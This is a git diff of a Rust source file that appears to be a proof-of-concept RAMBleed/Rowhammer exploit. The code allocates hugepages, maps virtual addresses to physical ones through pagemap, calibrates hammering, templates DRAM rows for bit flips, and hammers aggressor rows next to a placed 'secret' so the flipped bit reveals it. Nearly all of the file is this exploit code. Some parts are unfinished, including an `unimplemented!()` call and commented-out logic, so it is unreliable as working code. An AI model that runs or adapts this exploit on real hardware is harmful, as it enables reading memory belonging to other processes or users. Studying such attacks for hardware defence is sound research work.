@@ -1,109 +1,112 @@
 #![feature(try_trait)]
 #![feature(asm)]
 
+mod alloc;
 mod architecture;
 mod config;
+mod hammer;
 mod intelivy;
-mod alloc;
 mod memmap;
 mod profile;
-mod hammer;
 
-use crate::architecture::{DramAddr, Architecture};
-use crate::profile::Direction::{From1To0, From0To1};
+use crate::alloc::virt_to_phys_pagemap;
+use crate::alloc::{alloc_1gb_hugepage, alloc_2mb_buddy, alloc_2mb_hugepage, contig_mem_diff};
+use crate::architecture::{Architecture, DramAddr};
 use crate::config::Config;
-use crate::intelivy::IntelIvy;
-use crate::profile::Flip;
-use crate::memmap::{MemMap, offset_to_dram, DramRange};
-use crate::alloc::{contig_mem_diff, alloc_2mb_buddy, alloc_2mb_hugepage, alloc_1gb_hugepage};
 use crate::hammer::{hammer, reads_per_refresh};
+use crate::intelivy::IntelIvy;
+use crate::memmap::{offset_to_dram, DramRange, MemMap};
 use crate::profile::profile_ranges;
+use crate::profile::Direction::{From0To1, From1To0};
+use crate::profile::{profile_addr, Flip};
 use vm_info::page_size;
-use crate::alloc::virt_to_phys;
 
 const _READ_MULTIPLICATOR: usize = 2;
 
 // place the secret at buf + offset by unmapping part of buf
-fn place_secret(buf: &mut MemMap, offset: usize, c: &Config) -> Result<(), String> {
+fn place_secret(buf: &mut MemMap, da: &DramAddr, c: &Config) -> Result<(), String> {
     // place the secret at buf + offset by unmapping part of buf
     // POC here
-    buf[offset] = 0xff;
-    let dram_secret = offset_to_dram(offset, c);
-
+    *buf.at_dram(da, c) = 0xff;
+    //let dram_secret = offset_to_dram(offset, c);
+    let remove_range = unimplemented!();
     // remove address from the row
-    let row_ranges = same_row_ranges(buf, dram_secret.clone()).ok_or("No ranges")?;
-    let mut row_ranges_new = Vec::new();
-    for r in row_ranges {
-        let start_offset = c.arch.dram_to_phys(&r.start.clone());
-        if start_offset < offset && offset >= start_offset + r.bytes {
-            row_ranges_new.push(r.clone());
-        } else {
-            let r1 = DramRange { start: r.start.clone(), bytes: start_offset - offset };
-            if r1.bytes > 0 {
-                row_ranges_new.push(r1);
-            }
-            let r2 = DramRange {
-                start: offset_to_dram(offset + 1, c),
-                bytes: r.bytes - (start_offset - offset) - 1,
-            };
-            if r2.bytes > 0 {
-                row_ranges_new.push(r2);
-            }
-        }
-    }
+    //let row_ranges = buf.same_row_ranges(&dram_secret);
+    //    let mut row_ranges_new = Vec::new();
+    //    for r in row_ranges {
+    //        let start_offset = c.arch.dram_to_phys(&r.start.clone());
+    //        if start_offset < offset && offset >= start_offset + r.bytes {
+    //            row_ranges_new.push(r.clone());
+    //        } else {
+    //            let r1 = DramRange { start: r.start.clone(), bytes: start_offset - offset };
+    //            if r1.bytes > 0 {
+    //                row_ranges_new.push(r1);
+    //            }
+    //            let r2 = DramRange {
+    //                start: offset_to_dram(offset + 1, c),
+    //                bytes: r.bytes - (start_offset - offset) - 1,
+    //            };
+    //            if r2.bytes > 0 {
+    //                row_ranges_new.push(r2);
+    //            }
+    //        }
+    //    }
 
-    buf.range_map.insert(dram_secret.to_row_index(),
-                         row_ranges_new);
+    //buf.range_map.insert(dram_secret.to_row_index(),
+    //
+    //                     row_ranges_new);
+    buf.remove_range(remove_range);
     Ok(())
 }
 
-fn same_row_ranges(buf: &MemMap, da: DramAddr) -> Option<&Vec<DramRange>> {
-    buf.range_map.get(&da.to_row_index())
-}
-
 // find an address in the row as buf + offset that is mapped in buf
-fn same_row_addr(buf: &MemMap, offset: usize, c: &Config) -> Option<usize> {
+fn same_row_addr(buf: &MemMap, da: DramAddr, c: &Config) -> Option<DramAddr> {
     //let offset_aligned = offset - offset % page_size().unwrap_or(4096);
-    let da = offset_to_dram(offset, c);
-    let ranges = same_row_ranges(buf, da)?;
-    if ranges.is_empty() {
-        None
+    let ranges = buf.same_row_ranges(&da);
+    if let Some (r) = ranges.get(0) {
+        Some(r.start.clone())
     } else {
-        Some(c.arch.dram_to_phys(&ranges[0].start))
+        None
     }
 }
 
-fn read_sidechannel(buf: &MemMap, flip: &Flip, _c: &Config) -> Option<bool> {
-    let flip_byte = buf[flip.offset];
-    let flip_bit = flip_byte & (1 << flip.bit) != 0;
+fn read_sidechannel(mem: &mut MemMap, flip: &Flip, c: &Config) -> Option<bool> {
+    let &mut flip_byte = mem.at_dram(&flip.pos, c);//buf[flip.offset];
+    let flip_bit = flip_byte & (1 << flip.pos.bit) != 0;
     // hammering makes the vulnerable bit equal its neighbors
     Some(flip_bit)
 }
 
-fn fill_victim(buf: &mut MemMap, flip: &Flip, _c: &Config) {
-    buf[flip.offset] = match flip.dir {
+fn fill_victim(buf: &mut MemMap, flip: &Flip, c: &Config) {
+    *buf.at_dram(&flip.pos, c) = match flip.dir {
         From0To1 => 0x00,
         From1To0 => 0xff,
     };
 }
 
 // buf is 2MB-aligned
-fn bool_exploit_flip(buf: &mut MemMap, flip: &Flip, c: &Config) -> Option<bool> {
-    let secret_above = offset_above(buf, flip.offset, c)?;
-    let secret_below = offset_below(buf, flip.offset, c)?;
-    place_secret(buf, align_page_offset(secret_above), c).ok()?;
-    place_secret(buf, align_page_offset(secret_below), c).ok()?;
-    let aggressor_above = same_row_addr(buf, secret_above, c)?;
-    let aggressor_below = same_row_addr(buf, secret_below, c)?;
+fn bool_exploit_flip(mem: &mut MemMap, flip: &Flip, c: &Config) -> Option<bool> {
+    let cell_above = flip.pos.row_above();
+    let cell_below = flip.pos.row_below();
+    place_secret(mem, &cell_above, c).expect("failed to place secret");
+    place_secret(mem, &cell_below, c).expect("failed to place secret");
+    //let secret_above = offset_above(mem, flip.offset, c)?;
+    //let secret_below = offset_below(mem, flip.offset, c)?;
+    //place_secret(mem, align_page_offset(secret_above), c).ok()?;
+    //place_secret(mem, align_page_offset(secret_below), c).ok()?;
+    let aggressor_above = same_row_addr(mem, cell_above, c).expect("no address above exists");
+    let aggressor_below = same_row_addr(mem, cell_below, c).expect("no address below exists");
 
     //Fill flip address according to flip.dir
-    fill_victim(buf, flip, c);
+    fill_victim(mem, flip, c);
 
-    hammer(&buf[aggressor_above],
-           &buf[aggressor_below],
-           c.reads_per_hammer);
+    hammer(
+        mem.at_dram(&aggressor_above, c),
+        mem.at_dram(&aggressor_below, c),
+        c.reads_per_hammer,
+    );
 
-    read_sidechannel(buf, flip, c)
+    read_sidechannel(mem, flip, c)
 }
 
 fn align_page_offset(offset: usize) -> usize {
@@ -132,117 +135,175 @@ fn offset_below(_buf: &MemMap, offset: usize, c: &Config) -> Option<usize> {
     Some(c.arch.dram_to_phys(&dram_addr))
 }
 
-fn template_2mb_contig(mem: &MemMap, c: &Config) -> Vec<Flip> {
+fn template_dram_addr(mem: &mut MemMap, da: DramAddr, c: &Config) -> Vec<Flip> {
     let mut flips = vec![];
-    // iterate over map, hammer
-    for ((chan, dimm,rank, bank, row), rs) in mem.range_map.iter() {
-        if *row == 0 || *row == std::u16::MAX {
+    assert!(da.row != 0 && da.row != std::u16::MAX);
+
+    //let row_above = mem.same_row_ranges(&da.row_above());
+    //let da_above = da.row_above();
+    //let da_below = da.row_below();
+
+    //let row_below = mem.same_row_ranges(&da.row_below());
+    //let da_range = mem.same_row_ranges(&da);
+    let _da_range = &vec![DramRange {
+        start: da.clone(),
+        bytes: 1,
+    }];
+
+    println!(
+        "({}, {}, {}, {}): row {}",
+        da.chan, da.dimm, da.rank, da.bank, da.row
+    );
+    //println!("{:?}\n{:?}\n{:?}", row_above,rs, row_below);
+    //profile_ranges(mem, &row_above, &row_below, da_range, 0xff, c);
+    // 1 to 0
+    flips.append(profile_addr(mem, da, 0x00, c).as_mut());
+    //profile_ranges(mem, &row_above, &row_below, da_range, 0x00, c);
+    //flips.append(profile_ranges(mem, &row_above, &row_below, da_range, 0xff, c).as_mut());
+
+    flips
+}
+
+fn template_2mb_contig(mem: &mut MemMap, c: &Config) -> Vec<Flip> {
+    let mut flips = vec![];
+
+    for (da, rs) in mem.get_ranges().clone() {
+        if da.row == 0 || da.row == std::u16::MAX {
             continue;
         }
-        
-        let row_above = match mem.range_map.get(&(*chan, *dimm, *rank, *bank, *row - 1)) {
-            Some(r) => r,
-            None => continue,
-        };
-        let row_below = match mem.range_map.get(&(*chan, *dimm,*rank, *bank, *row + 1)) {
-            Some(r) => r,
-            None => continue,
-        };
+        println!("({}, {}, {}, {}): row {}", da.chan, da.dimm, da.rank, da.bank, da.row);
 
-        println!("({}, {}, {}, {}): row {}", rs[0].start.chan, rs[0].start.dimm, rs[0].start.rank, rs[0].start.bank, rs[0].start.row);
-        flips.append(profile_ranges(mem, row_above, row_below, rs, 0x00, c).as_mut());
-        flips.append(profile_ranges(mem, row_above, row_below, rs, 0xff, c).as_mut());
+        let row_above = mem.same_row_ranges(&da.row_above());
+        let row_below = mem.same_row_ranges(&da.row_below());
+
+        let mut flips_above = profile_ranges(mem, &row_above, &row_below, &rs, 0x00, c);
+        let mut flips_below = profile_ranges(mem, &row_above, &row_below, &rs, 0xff, c);
+        flips.append(&mut flips_above);
+        flips.append(&mut flips_below);
     }
 
     flips
 }
 
-fn test_contig_mem_diff(c : &Config) {
+pub fn test_contig_mem_diff(c: &Config) {
     let mem_attack = alloc_1gb_hugepage(c).unwrap();
-    println!("Allocated memory successfully at {:?}", mem_attack.buf);
-    let start_p = virt_to_phys(mem_attack.buf).unwrap();
+    println!("Allocated memory successfully at {:?}", &mem_attack[0]);
+    let start_p = virt_to_phys_pagemap(&mem_attack[0]).unwrap();
     print!("phys: {:X}", start_p);
     //let end_p = virt_to_phys(unsafe { mem_attack.add(2 * 1<<20 - 1) }).unwrap();
     //assert_eq!(start_p + 2 * 1<<20 - 1, end_p)
 }
 
-pub fn test_alloc(c : &Config) {
+pub fn test_alloc(c: &Config) {
     contig_mem_diff(c);
 }
 
-pub fn test_template(c : &Config) {
-    let mem_attack = alloc_2mb_buddy(&c).unwrap();
-    let flips = template_2mb_contig(&mem_attack, &c);
+pub fn test_template(c: &Config) {
+    let mut mem_attack = alloc_2mb_buddy(&c).unwrap();
+    let flips = template_2mb_contig(&mut mem_attack, &c);
     println!("Found flips: {:?}", flips)
 }
 
 pub fn test_rambleed() {
-    let c: Config = Config{
+    let c: Config = Config {
         aligned_bits: 20,
         reads_per_hammer: 100,
         contiguous_dram_addr: 0,
         arch: Box::new(IntelIvy {
             dual_channel: false,
             dual_dimm: false,
-            dual_rank: true
-        }) };
+            dual_rank: true,
+        }),
+    };
     let mut mem_attack = alloc_2mb_buddy(&c).unwrap();
-    let flips = template_2mb_contig(&mem_attack, &c);
+    let flips = template_2mb_contig(&mut mem_attack, &c);
     for f in flips {
         let val = bool_exploit_flip(&mut mem_attack, &f, &c);
         println!("Secret value is {:?}", val);
     }
 }
 
-fn row_conflict_pair(mem : &MemMap) -> Option<(DramAddr, DramAddr)> {
-    for ((c1, d1, r1, b1, row1), a1s) in mem.range_map.iter() {
+fn row_conflict_pair(mem: &MemMap) -> Option<(DramAddr, DramAddr)> {
+    for (da1, a1s) in mem.get_ranges().iter() {
         let a1 = a1s.get(0);
-        let a2 : Option<&DramRange> = mem.range_map.iter().filter(
-            |((c2, d2, r2, b2, row2), a2s)|
-                        c1 == c2 && d1 == d2 && r1 == r2 && b1 == b2 && row1 != row2 && !a2s.is_empty())
-            .map(|(_, a2s)| &a2s[0]).next();
+        let a2: Option<&DramRange> = mem
+            .get_ranges()
+            .iter()
+            .filter(|(da2, a2s)| {
+                da1.chan == da2.chan
+                    && da1.dimm == da2.dimm
+                    && da1.rank == da2.rank
+                    && da1.bank == da2.bank
+                    && da1.row != da2.row
+                    && !a2s.is_empty()
+            })
+            .map(|(_, a2s)| &a2s[0])
+            .next();
 
         match (a1, a2) {
             (None, _) => continue,
             (_, None) => continue,
-            (Some(a1), Some (a2)) => return Some ((a1.start.clone(), a2.start.clone())),
+            (Some(a1), Some(a2)) => return Some((a1.start.clone(), a2.start.clone())),
         }
     }
 
     None
 }
 
-fn calibrate<T : Architecture>(mem : &MemMap, a : T) -> usize{
+fn calibrate<T: Architecture>(mem: &MemMap, a: T) -> usize {
     let (a1, a2) = row_conflict_pair(mem).expect("No row conflict pair found! Calibration failed");
-    let a1 = mem.buf.wrapping_add(a.dram_to_phys(&a1));
-    let a2 = mem.buf.wrapping_add(a.dram_to_phys(&a2));
-    3*reads_per_refresh(a1, a2, a.refresh_period())
+    let a1 = mem.offset(a.dram_to_phys(&a1));
+    let a2 = mem.offset(a.dram_to_phys(&a2));
+    2 * reads_per_refresh(a1, a2, a.refresh_period())
 }
 
 fn main() {
     let arch = IntelIvy {
         dual_channel: false,
         dual_dimm: false,
-        dual_rank: true
+        dual_rank: true,
     };
-    let mut c: Config = Config{
+    let mut c: Config = Config {
         aligned_bits: 20,
         reads_per_hammer: 0,
-        contiguous_dram_addr: 1<<12,
-        arch : Box::new(arch.clone()),
-        };
+        contiguous_dram_addr: 1 << 12,
+        arch: Box::new(arch.clone()),
+    };
 
-    let mem_attack = alloc_2mb_hugepage(&c)
-        .expect("Failed to allocate memory using hugepages");
+    let mem_attack2 = alloc_2mb_hugepage(&c);
 
-    println!("Allocated memory successfully at {:?}", mem_attack.buf);
-    let start_p = virt_to_phys(mem_attack.buf).unwrap_or(std::usize::MAX);
+    let mem_attack3 = alloc_2mb_hugepage(&c);
+    let mut mem_attack = alloc_2mb_hugepage(&c).expect("Failed to allocate memory using hugepages");
+
+    println!(
+        "Allocated memory successfully at {:?}",
+        (*mem_attack).as_ptr()
+    );
+    let start_p = virt_to_phys_pagemap(mem_attack.as_ptr()).unwrap_or(std::usize::MAX);
     println!("Physical address: {:p}", start_p as *const usize);
 
     c.reads_per_hammer = calibrate(&mem_attack, arch);
-    println!("Calibrated to {} iterations per hammering", c.reads_per_hammer);
-    let flips = template_2mb_contig(&mem_attack, &c);
+    println!(
+        "Calibrated to {} iterations per hammering",
+        c.reads_per_hammer
+    );
+    let addr = DramAddr {
+        chan: 0,
+        dimm: 0,
+        rank: 0,
+        bank: 4,
+        row: 12,
+        col: 420,
+        byte: 5,
+        bit: 0,
+    };
+    //let flips = template_dram_addr(&mut mem_attack, addr, &c);
+    let flips = template_2mb_contig(&mut mem_attack, &c);
     println!("Found the following flips {:?}", flips);
+    println!(
+        "Flips as DRAM: {:?}",
+        flips
+    );
     //contig_mem_diff(mem, c);
     //println!("{:#?}", offset_to_dram(0, &c));
     //println!("{:#?}", offset_to_dram(1002000, &c));
